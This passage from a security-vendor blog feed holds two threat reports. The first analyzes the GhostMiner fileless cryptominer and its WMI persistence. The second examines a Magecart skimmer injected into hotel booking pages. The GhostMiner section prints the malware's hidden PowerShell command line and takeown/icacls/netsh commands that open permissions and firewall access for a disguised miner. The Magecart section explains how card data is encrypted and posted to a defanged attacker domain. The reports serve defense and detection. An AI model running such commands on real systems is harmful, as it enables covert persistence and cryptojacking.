<p>\\.\ROOT\subscription:__FilterToConsumerBinding.Consumer=&#8221;CommandLineEventConsumer.Name=\&#8221;PowerShell Event Log Consumer\&#8221;&#8221;,Filter=&#8221;__EventFilter.Name=\&#8221;PowerShell Event Log Filter\&#8221;&#8221;</p>
<p><em>Consumer</em> : CommandLineEventConsumer.Name=&#8221;PowerShell Event Log Consumer&#8221;</p>
<p><em>Filter </em>: __EventFilter.Name=&#8221;PowerShell Event Log Filter&#8221;</p>
<p><strong>Event Consumer</strong></p>
<p>\\.\ROOT\subscription:CommandLineEventConsumer.Name=&#8221;PowerShell Event Log Consumer&#8221;</p>
<p><em>CommandLineTemplate</em> : C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.eXe -NoP -NonI -EP ByPass -W Hidden -E &lt;Base-64 encoded script&gt;</p></blockquote>
<p>GhostMiner will also install a WMI class named “<strong>PowerShell_Command</strong>” at the root\Default namespace. This WMI class contains the entries <strong>Command </strong>and <strong>CCBot</strong> that contains base-64 encoded functions.</p>
<p>When the <strong>EventConsumer</strong> is triggered, it will read entries from <strong>Command</strong> and <strong>CCBot </strong>from the installed WMI <strong>“PowerShell_Command”</strong> object.</p>
<p>The <strong>Command</strong> script, when executed, will do the following:</p>
<p>&nbsp;</p>
<table class="centerTable" style="width: 600px;margin: 0px auto;text-align: left;line-height: 15px">
<tbody>
<tr>
<td style="text-align: center" width="100"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">Functions</span></strong></span></td>
<td style="text-align: center" width="100"><span style="color: #ff0000"><strong><span style="text-align: center">Task</span></strong></span></td>
</tr>
<tr>
<td style="text-align: center" width="100">WMI_KillFake</td>
<td style="text-align: center" width="100">Terminates processes and deletes corresponding files based on a list of conditions</td>
</tr>
<tr>
<td style="text-align: center" width="100">WMI_KillService</td>
<td style="text-align: center" width="100">Terminates services based on a set of conditions</td>
</tr>
<tr>
<td style="text-align: center" width="100">WMI_Scanner</td>
<td style="text-align: center" width="100">Terminates processes of known cryptominers in the process memory</td>
</tr>
<tr>
<td style="text-align: center" width="100">WMI_CheckFile</td>
<td style="text-align: center" width="100">Verifies the integrity of the file it drops</td>
</tr>
</tbody>
</table>
<p style="text-align: center">Table 1. List of functions the Command script performs once executed</p>
<p>Aside from the abovementioned functions, the Command script also has a <strong>WMI_Killer </strong>function, which terminates running processes, and deletes scheduled tasks and services that are associated with cryptocurrency-mining malware families such as:</p>
<ol>
<li><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-a-mykings-variant-with-bootloader-persistence-via-managed-detection-and-response/">Mykings</a></li>
<li><a href="https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/fileless-malware-powerghost-targets-corporate-systems">PowerGhost</a></li>
<li><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/">PCASTLE</a></li>
<li><a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.blueroh.rpb">BULEHERO</a></li>
<li>Other generic MALXMR variants used by several malware families, including <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/blacksquid-slithers-into-servers-and-drives-with-8-notorious-exploits-to-drop-xmrig-miner/">BlackSquid</a></li>
</ol>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1.png"><img class="aligncenter wp-image-86046" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1.png" alt="" width="1145" height="215" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1.png 1698w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-200x38.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-768x144.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-1024x192.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-640x120.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-900x169.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-440x83.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-380x71.png 380w" sizes="(max-width: 1145px) 100vw, 1145px" /></a></p>
<p style="text-align: center">Figure 1. List of service names that WMI_Killer terminates and deletes</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2.png"><img class="aligncenter wp-image-86047" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2.png" alt="Fig 2_Fileless Cryptocurrency-Miner GhostMiner Weaponizes WMI Objects" width="1144" height="200" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2.png 1692w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-200x35.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-768x134.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-1024x179.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-640x112.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-900x157.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-440x77.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-380x66.png 380w" sizes="(max-width: 1144px) 100vw, 1144px" /></a></p>
<p style="text-align: center">Figure 2. List of scheduled tasks that WMI_Killer deletes</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4.png"><img class="aligncenter wp-image-86049" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4.png" alt="" width="1147" height="163" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4.png 1698w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-200x28.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-768x109.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-1024x145.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-640x91.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-900x128.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-440x62.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-380x54.png 380w" sizes="(max-width: 1147px) 100vw, 1147px" /></a></p>
<p style="text-align: center">Figure 3. List of cryptocurrency-mining-related processes that the the WMI_Killer terminates</p>
<p><strong>WMI_Killer</strong> also terminates TCP traffic that uses a list of cryptocurrency-mining malware’s commonly used ports.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3.png"><img class="aligncenter wp-image-86048" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3.png" alt="" width="1148" height="442" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3.png 1705w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-200x77.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-768x295.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-1024x394.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-640x246.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-900x346.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-440x169.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-380x146.png 380w" sizes="(max-width: 1148px) 100vw, 1148px" /></a></p>
<p style="text-align: center">Figure 4. Figure 4. List of ports that the WMI_Killer monitors</p>
<p>Another Command script function, the <strong>WMI_CheckHosts</strong>, is able to modify the host files of the infected machine and modifies entries that are related to malicious malware such as <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.blueroh.rpb">BULEHERO</a>.</p>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5.png"><img class="aligncenter wp-image-86050" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5.png" alt="" width="1149" height="396" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5.png 1676w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-200x69.png 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-768x264.png 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-1024x353.png 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-640x220.png 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-900x310.png 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-440x151.png 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-380x131.png 380w" sizes="(max-width: 1149px) 100vw, 1149px" /></a></p>
<p style="text-align: center">Figure 5. WMI_CheckHosts function that modifies the infected machine’s hosts files based on the mapped entries that are related to its competition</p>
<p>Meanwhile, the <strong>CCBOT </strong>entry uses two IP addresses, namely 118[.]24[.]63[.]208 and 103[.]105[.]59[.]68, as C&amp;C servers. It uses Base-64 to encode the send command and ROT-13, a letter substitution cipher that changes the 13th letter after it, to decode the received command.</p>
<p>We observed that the backdoor communication is only enabled between 12AM to 5AM. It uses an invoke-expression (IEX) when the C&amp;C server receives a response. Otherwise, it will continuously try to connect to the abovementioned IP addresses every 30 seconds using the <strong>“/Update/CC/CC.php”</strong> URI path.</p>
<p>Aside from <strong>Command</strong> and <strong>CCBot</strong>, The “PowerShell_Command” class also contains the following objects:</p>
<p><strong>Miner </strong>: &lt;Base-64 encoded binary code&gt;</p>
<p><strong>Ver </strong>: &lt;Version Number&gt; (The current version is v2.13.0)</p>
<p><strong>mPId </strong>: &lt;Process ID of the running cryptocurrency-miner&gt;</p>
<p><strong>nPId </strong>: &lt;Process ID of the installer&gt;</p>
<p>The miner is a 64-bit payload that is dropped when <strong>Command</strong> is decoded and executed. However, before it gets dropped, GhostMiner determines the free disk space on the root drive. If the free space is less than 1 GB, it will drop a 10 MB-sized payload. Otherwise, it will drop a 100 MB-sized payload. GhostMiner will then append 2,130 bytes of random value. The file will then be saved as <strong>C:\Windows\Temp\lsass.exe</strong>.</p>
<p>The malware will then execute the following commands as part of the miner’s execution routine:</p>
<p><em>                Takeown.exe /f C:\Windows\Temp</em></p>
<p><em>                iCACLs.exe C:\Windows\Temp /Reset /T /C</em></p>
<p><em>                iCACLs.exe C:\Windows\Temp /Grant Everyone:F /T /C</em></p>
<p><em>                iCACLs.exe C:\Windows\Temp\lsass.exe /E /G Everyone:F /C</em></p>
<p><em>                NetSH Firewall Add AllowedProgram C:\Windows\Temp\lsass.exe “Windows Update”</em></p>
<p><em>                Start-Process –FilePath C:\Windows\Temp\lsass.exe –WindowStyle Hidden –PassThru</em></p>
<p>As of writing time, the XMR wallet associated with this campaign only has 50.278384965000 XMR (US$3,868.02) in total paid value.</p>
<p>The <a href="https://www.trendmicro.com/en_us/business/products/network/advanced-threat-protection/inspector.html">Trend Micro Deep Discovery Inspector</a> protects customers from threats that may lead to C&amp;C connection and data exfiltration via this DDI rule:</p>
<ul>
<li>4219: GHOSTMINER &#8211; HTTP (Request)</li>
</ul>
<p><strong>Indicators of Compromise (IoCs)</strong></p>
<table width="0">
<tbody>
<tr>
<td style="text-align: center" width="100"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">SHA-256</span></strong></span></td>
<td style="text-align: center" width="100"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">Trend Micro Predictive Machine Learning Detection</span></strong></span></td>
<td style="text-align: center" width="100"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">Trend Micro Pattern Detection</span></strong></span></td>
</tr>
<tr>
<td width="481">13a4751b83e53abdf0fb6d5876d6cc9dfbd33e343038dae6951de755d93c8284</p>
<p>&nbsp;</td>
<td rowspan="6" width="202">Troj.Win32.TRX.XXPE50FFF031</td>
<td rowspan="4" width="245">Coinminer.Win64.MALXMR.TIAOODBZ</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="481">558914713cf3174c8b489aef12a1a7871ad886bc9483fd7b0790383702bfd75d</td>
</tr>
<tr>
<td width="481">7cec25bdb7c3cb2778168e9b02e0fdd608a6c94cb69feba7b4ee647aef0588b1</td>
</tr>
<tr>
<td width="481">8ffa7f991637e28fa5b4ae7f5522fe5fee622307bed87d1d478c48fa0696dc5a</td>
</tr>
<tr>
<td width="481">a0e0e5d0ff95e3193ed0999234588e3327ea8d759316a0d1175c5084daf5b083</td>
<td width="245">Coinminer.Win64.MALXMR.TIAOODC</td>
</tr>
<tr>
<td width="481">aa16c957a85ecedaac9f629082913dfdaefe95b8b8191d7cb3e8c02da2963452</td>
<td width="245">&nbsp;</p>
<p>Coinminer.Win64.MALXMR.TIAOODBZ</p>
<p>&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/">Fileless Cryptocurrency-Miner GhostMiner Weaponizes WMI Objects, Kills Other Cryptocurrency-Mining Payloads</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=luYFo5ENt90:NCoQH7TLFIo:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=luYFo5ENt90:NCoQH7TLFIo:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=luYFo5ENt90:NCoQH7TLFIo:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=luYFo5ENt90:NCoQH7TLFIo:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/luYFo5ENt90" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/</feedburner:origLink></item>
		<item>
		<title>Magecart Skimming Attack Targets Mobile Users of Hotel Chain Booking Websites</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/0dhQsbIZuEw/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/#respond</comments>
				<pubDate>Wed, 18 Sep 2019 11:52:41 +0000</pubDate>
		<dc:creator><![CDATA[Joseph C Chen (Fraud Researcher)]]></dc:creator>
				<category><![CDATA[Malware]]></category>
		<category><![CDATA[Magecart]]></category>
		<category><![CDATA[Skimmer]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86054</guid>
				<description><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>We discovered a series of incidents where the credit card skimming attack Magecart was used to hit the booking websites of chain-brand hotels — the second time we’ve seen a Magecart threat actor directly hit ecommerce service providers instead of going for individual stores or third-party supply chains. </p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/">Magecart Skimming Attack Targets Mobile Users of Hotel Chain Booking Websites</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>We discovered a series of incidents where the credit card skimming attack Magecart was used to hit the booking websites of chain-brand hotels — the second time we’ve seen a Magecart threat actor directly hit ecommerce service providers instead of going for individual stores or third-party <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-magecart-attack-delivered-through-compromised-advertising-supply-chain/">supply chains</a>. Back in May, we discovered a new Magecart-using group called “<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mirrorthief-group-uses-magecart-skimming-attack-to-hit-hundreds-of-campus-online-stores-in-us-and-canada/">Mirrorthief</a>,” which compromised an ecommerce service provider used by American and Canadian universities.</p>
<p>In early September, we found two hotel websites (from different hotel chains) that were being injected with a JavaScript code to load a remote script on their payment page since August 9. When we first checked the script’s link, it downloaded a normal JavaScript code. However, we found that the same link could also download a different script when we requested it from mobile devices like Android or iOS phones. The downloaded script for mobile devices is a credit card skimmer which can steal the information entered on the hotel booking page and send it to a remote server.</p>
<p>We found both of the affected hotel websites were developed by Roomleader, a company from Spain that helps hotels build their online booking websites. The malicious code wasn’t injected directly into the website but rather into the script of Roomleader’s module called “viewedHotels” that was provided to its clients and subsequently used for two websites of two different hotel chains. Despite the seemingly small number of affected sites, we still consider the attack significant given that one of the brands has 107 hotels in 14 countries while the other has 73 hotels in 14 countries. Note that we have reached out to Roomleader regarding this issue.</p>
<h4><strong>The script injected into the hotel booking website</strong></h4>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-1.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-1.jpg" alt=" Figure 1. Infection chain of the Magecart skimming attack on the online hotel booking websites" width="550" /></a></p>
<p align="center">Figure 1. Infection chain of the Magecart skimming attack on the online hotel booking websites</p>
<p>As mentioned, the injection was done on a JavaScript library of Roomleader’s “viewedHotels” module located at <em>hxxps://[hotel website]/modulos/viewedHotels/templates/public/js/history_setter[.]js</em>. This library is used for saving the viewed hotel information in the visitor’s browser cookies. The attacker injected the malicious code in the middle of the original script.</p>
<p>The injected code first checks if an HTML element containing the ID “customerBookingForm” is present on the webpage to make sure it is running on the hotel’s booking page. If the injected code is found to not be running on the page, it will go to sleep for one second and check repeatedly thereafter. However, if the code detects the booking page, it will check if the browser debugger is closed and then load another JavaScript from the URL <em>hxxps://googletrackmanager[.]com/gtm[.]js</em> — which is where the card skimmer code is actually located. It’s worth noting that the style of the URL is meant to emulate the legitimate URL used by <a href="https://tagmanager.google.com/">Google Tag Manager</a>.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-2.png" alt="Figure 2. The injected script (highlighted) in the JavaScript library used by hotel websites" width="550" /></a></p>
<p align="center">Figure 2. The injected script (highlighted) in the JavaScript library used by hotel websites</p>
<h4><strong>Analysis of the credit card skimmer</strong></h4>
<p><strong> </strong>When we first connected to the skimmer URL, it returned normal JavaScript code copied from the GitHub project <a href="https://github.com/smali-kazmi/detect-mobile-browser/blob/master/detect-browser.js">detect-mobile-browser</a>. However, we suspected it was not the real payload because the code isn’t actually used by the affected websites.</p>
<p>Upon further testing of the URL, we found that it downloaded a different script when we made a request using an HTTP User-Agent from a mobile device. This script turned out to be a credit card skimmer. Although we found the skimmer to work on both PC and mobile browsers, it seems the attacker only targeted mobile users. This is most likely because the threat actor behind it wants to avoid detection from PC-based security software. The skimmer is not a new one — we’ve seen instances where it was used by other groups. Most likely, it is a general skimmer that is shared via underground forums.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-3.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-3.png" alt=" Figure 3. The different scripts downloaded from the skimmer URL for desktop and mobile" width="550" /></a></p>
<p align="center">Figure 3. The different scripts downloaded from the skimmer URL for desktop and mobile</p>
<p>The credit card skimmer is designed to steal data from payment forms. The skimmer hooks its function to the JavaScript events “submit” and “click,” which are usually triggered when people submit a payment or a booking. When the hooked event is triggered, the skimmer will check if the browser debugger is closed. Then it copies the name and value from any “input” or “select” HTML element on the booking page. In this case, the gathered information includes names, email addresses, telephone numbers, hotel room preferences, and credit card details.</p>
<p>The copied information is encrypted using RC4 with a hardcoded key: “F8C5Pe4Q”. Next, the skimmer will generate a random string to encode the encrypted data again using XOR. The data will then be sent via HTTP POST to the remote URL “https://googletrackmanager[.]com/gtm.php?id=” that uses generated random string appended at the end. Upon receipt of the information, the attacker can then decrypt the data and collect the credit card information.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-4.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-4.png" alt=" Figure 4. Credit card skimmer code to steal information from hotel booking page" width="550" /></a></p>
<p align="center">Figure 4. Credit card skimmer code to steal information from hotel booking page</p>
<h4><strong>Magecart replaces the original booking page with a fake one</strong></h4>
<p>Although the skimmer itself is not unique, we found that it removes the original credit card form on the booking page and injects another one prepared by the threat actor. We theorize two possible reasons for this. The first is that some hotels don’t ask customers to make online payments but instead ask them to pay at the hotel upon arrival. In cases like this, the booking form will ask for credit card information but without the CVC number. To ensure that all credit card information are captured, the attacker replaces the original form with one that contains the CVC number column.</p>
<p>The second possible reason is that, sometimes, the booking page will host the credit card form in a different domain using an HTML <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe">iframe</a> element to make it more secure. In this scenario, a regular JavaScript skimmer will not be able to copy the data inside the secure iframe. Therefore, the attacker removes the iframe of the secured credit card form and injects his own form so the skimmer can copy the information.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-5.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-5.png" alt="Figure 5. The original credit card form (above) from the hotel website and the injected form (below) from the skimmer" width="550" /></a></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-6.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-6.png" alt="Figure 5. The original credit card form (above) from the hotel website and the injected form (below) from the skimmer" width="550" /></a></p>
<p align="center">Figure 5. The original credit card form (above) from the hotel website and the injected form (below) from the skimmer</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-7.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-7.png" alt=" Figure 6. The skimmer script used to remove the original form from the booking page and replace it with the fake one" width="550" /></a></p>
<p align="center">Figure 6. The skimmer script used to remove the original form from the booking page and replace it with the fake one</p>
<p>To make it seem more legitimate, the attacker also prepared credit card forms in eight languages: English, Spanish, Italian, French, German, Portuguese, Russian, and Dutch. These languages match the languages supported by the targeted hotel websites. The skimmer will check which language the customer is using for the website and inject the corresponding fake credit card form into the page.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-8.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/magecart-mobile-hotels-8.png" alt="Figure 7. The eight languages of the fake credit card form inside the skimmer" width="550" /></a></p>
<p align="center">Figure 7. The eight languages of the fake credit card form inside the skimmer</p>
<p>We were unable to find any strong connections to previous Magecart groups based on the network infrastructure or the malicious code used in this attack. However, it’s possible that the threat actor behind this campaign was also involved in previous campaigns.</p>
<h4><strong>Conclusion</strong></h4>
<p>Recent incidents involving credit card skimmers like Magecart emphasize the need for businesses to <a href="https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-by-design-devops-in-the-era-of-the-gdpr?_ga=2.167625470.1324830332.1567993238-94385647.1557215823">secure their websites</a> from potential compromise by implementing security best practices, which include regularly updating software to the latest versions and segregating networks to ensure that as little customer data as possible is exposed.</p>
<p>Furthermore, users can consider using payment systems such as Apple Pay and Google Pay, which offer additional authentication methods — minimizing the chance that attackers will be able to use the credit card even if they manage to collect the card’s details.</p>
<p>The following Trend Micro solutions protect users and businesses by blocking the scripts and preventing access to the malicious domains:</p>
<ul>
<li><a href="https://www.trendmicro.com/us/home/products/software/index.html">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Security</a></li>
<li><a href="https://www.trendmicro.com.ph/ph/business/complete-user-protection/index.html">Smart Protection Suites</a> and <a href="https://www.trendmicro.com/us/small-business/product-security/">Worry-Free<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Business Security</a></li>
<li><a href="https://www.trendmicro.com/us/business/cyber-security/index.html">Trend Micro Network Defense</a></li>
<li><a href="https://www.trendmicro.com/us/business/cloud-data/index.html">Hybrid Cloud Security</a></li>
</ul>
<h4><strong>Indicators of Compromise (IoCs)</strong></h4>
<table>
<tbody>
<tr>
<td width="470"><strong>SHA-256 Hash/ URL</strong></td>
<td width="50"><strong>File Name</strong></td>
<td width="73"><strong>Details</strong></td>
<td width="166"><strong>Detection name</strong></td>
</tr>
<tr>
<td width="470">ac58602d149305bd2331d555c15e6292bd5d09c34ade9e5eebb81e9ef1e7b312</td>
<td width="50"><em>gtm.js</em></td>
<td width="73">Credit card skimmer</td>
<td width="166">TrojanSpy.JS.MAGECART.B</td>
</tr>
<tr>
<td width="470">googletrackmanager[.]com</td>
<td width="50"></td>
<td width="73">Magecart Domain</td>
<td width="166"></td>
</tr>
</tbody>
</table>
<p><strong>With special thanks to our colleagues at </strong><a href="https://abuse.ch/"><strong>abuse.ch</strong></a><strong> and </strong><a href="http://shadowserver.org/"><strong>The Shadowserver Foundation</strong></a><strong> for helping to take down the Magecart domain</strong></p>
